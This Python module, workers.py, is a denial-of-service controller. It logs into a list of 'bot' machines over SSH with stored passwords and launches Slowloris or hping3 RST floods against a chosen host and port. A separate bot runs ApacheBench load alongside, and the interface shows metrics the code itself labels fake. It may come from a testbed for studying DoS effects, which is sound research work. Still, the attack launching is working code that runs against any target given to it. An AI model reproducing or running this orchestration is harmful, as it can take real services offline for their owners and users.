# workers.py (แก้ไขส่วน __init__ และ run ให้ทนทานขึ้น)
# -*- coding: utf-8 -*-
import threading
import time
import random
import paramiko
import re
from config import BOTS
from models import Bus

class AttackWorker(threading.Thread):
    def __init__(self,
                 bus: Bus,
                 target: str,
                 workers: int = 1,
                 sockets: int = 250,
                 duration: int = 60,
                 num_bots: int = 1,
                 attack_type: str = "Slowloris",
                 port: int = 80,
                 connected_bots: list = None):
        super().__init__(daemon=True)
        self.bus = bus
        self.target = target

        # Robust type coercion & validation
        try:
            self.workers = int(workers)
        except Exception:
            self.workers = 1

        try:
            self.sockets = int(sockets)
        except Exception:
            self.sockets = 250

        try:
            self.duration = int(duration)
        except Exception:
            self.duration = 60

        try:
            self.num_bots = int(num_bots)
        except Exception:
            # if conversion fails, try to fallback to 1
            try:
                # if it's a numeric string with spaces etc.
                self.num_bots = int(str(num_bots).strip())
            except Exception:
                self.num_bots = 1

        self.attack_type = str(attack_type)
        try:
            self.port = int(port)
        except Exception:
            self.port = 80

        self.connected_bots = connected_bots if connected_bots is not None else BOTS
        self._stop = False
        self.normal_bot = None  # For normal access bot

    def stop(self):
        self._stop = True

    def _extract_ip(self, target: str) -> str:
        """Extract IP address from target URL or return target if it's already an IP."""
        ip_pattern = r'(\d{1,3}(?:\.\d{1,3}){3})'
        match = re.search(ip_pattern, target)
        if match:
            return match.group(1)
        return target  # Assume it's already an IP if no match

    def run(self):
        # Choose attack target for commands that need bare IP
        attack_target = self._extract_ip(self.target) if self.attack_type == "hping3" else self.target

        # Filter attack-capable bots safely
        attack_bots = [bot for bot in self.connected_bots if getattr(bot, "role", "Attack") == "Attack"]

        # Ensure num_bots is within valid bounds
        if self.num_bots <= 0:
            self.num_bots = 1

        # If not enough bots, reduce to available
        if len(attack_bots) == 0:
            self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] WARNING: No attack-capable bots available.")
            selected_bots = []
        else:
            sample_count = min(self.num_bots, len(attack_bots))
            # random.sample requires integer <= len(sequence)
            try:
                selected_bots = random.sample(attack_bots, sample_count)
            except Exception:
                # fallback: shuffle and slice
                random.shuffle(attack_bots)
                selected_bots = attack_bots[:sample_count]

        self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Using {len(selected_bots)} bots for {self.attack_type} attack")

        # Select the normal node (bot with role="Normal")
        normal_bots = [bot for bot in self.connected_bots if getattr(bot, "role", "") == "Normal"]
        if normal_bots:
            self.normal_bot = normal_bots[0]
            self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Selected {self.normal_bot.host} as normal access bot")
        else:
            self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] No normal node found, skipping normal access")

        # Construct URL for normal access / other commands
        if self.attack_type == "GoldenEye":
            url = self.target
        else:
            url = f"http://{attack_target}:{self.port}/"

        # Commands (unchanged)
        if self.attack_type == "Slowloris":
            cmd = (f"nohup python3 ~/Desktop/slowloris/slowloris.py {attack_target} "
                   f"-s {self.sockets} -p {self.port} > slowloris.log 2>&1 &")
            stop_cmd = "pkill -f slowloris.py"
        elif self.attack_type == "hping3":
            cmd = f"sudo /usr/sbin/hping3 -R {attack_target} -p {self.port} --flood > hping3.log 2>&1 &"
            stop_cmd = "sudo pkill -f hping3"
        else:
            # default fallback
            cmd = (f"nohup python3 ~/Desktop/slowloris/slowloris.py {attack_target} "
                   f"-s {self.sockets} -p {self.port} > slowloris.log 2>&1 &")
            stop_cmd = "pkill -f slowloris.py"

        normal_cmd = (
            f'ab -n 1000 -c 50 -s 120 {url} >> normal_access_detailed.log 2>&1; '
        )

        self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Starting {self.attack_type} attack on {attack_target} port {self.port}")

        # hping3 availability check (kept as-is, safe-guarded)
        if self.attack_type == "hping3":
            for b in selected_bots:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(b.host, username=b.user, password=b.password, timeout=8)
                    stdin, stdout, stderr = ssh.exec_command("which hping3")
                    hping3_path = stdout.read().decode().strip()
                    if not hping3_path:
                        self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] ERROR: hping3 not found on {b.host}")
                    ssh.close()
                except Exception as e:
                    self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] ERROR checking hping3 on {b.host}: {e}")

        # Start normal access on the selected bot if available
        if self.normal_bot:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.normal_bot.host, username=self.normal_bot.user, password=self.normal_bot.password, timeout=8)
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Starting normal access on {self.normal_bot.host} to {url}")
                ssh.exec_command(normal_cmd)
                ssh.close()
            except Exception as e:
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] ERROR starting normal access on {self.normal_bot.host}: {e}")

        # Start attack on each selected bot (SSH)
        for b in selected_bots:
            if self._stop:
                break
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(b.host, username=b.user, password=b.password, timeout=8)
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Connected to {b.host} • Starting {self.attack_type} attack on port {self.port}")
                stdin, stdout, stderr = ssh.exec_command(cmd)
                error = stderr.read().decode().strip()
                if error:
                    self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] ERROR executing attack on {b.host}: {error}")
                ssh.close()
            except Exception as e:
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] ERROR {b.host}: {e}")

        # Attack loop (seconds)
        start = time.time()
        while not self._stop:
            elapsed = time.time() - start
            if elapsed >= self.duration:
                break
            pct = int((elapsed / max(1.0, float(self.duration))) * 100)
            left = max(0, int(self.duration - elapsed))
            # Emit some fake metrics for UI
            metrics = {
                "rps": int(1200 + (elapsed / max(1.0, float(self.duration))) * 800),
                "latency": int(90 + random.random() * 60)
            }
            # ensure progress between 0..100
            self.bus.progress.emit(min(max(pct, 0), 100))
            self.bus.countdown.emit(left)
            self.bus.metrics.emit(metrics)
            self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Attacking with {self.attack_type}... {pct}%")
            time.sleep(1)

        # Stop normal access if started
        if self.normal_bot:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.normal_bot.host, username=self.normal_bot.user, password=self.normal_bot.password, timeout=8)
                ssh.exec_command("pkill ab")
                ssh.close()
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Stopped normal access on {self.normal_bot.host}")
            except Exception as e:
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Stop error for normal access on {self.normal_bot.host}: {e}")

        # Stop all selected bots
        for b in selected_bots:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(b.host, username=b.user, password=b.password, timeout=8)
                ssh.exec_command(stop_cmd)
                ssh.close()
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Stopped {self.attack_type} attack on {b.host}")
            except Exception as e:
                self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] Stop error on {b.host}: {e}")

        self.bus.progress.emit(100)
        self.bus.countdown.emit(0)
        self.bus.log.emit(f"[{time.strftime('%H:%M:%S')}] {self.attack_type} attack finished on all bots.")
        self.bus.status.emit("idle")
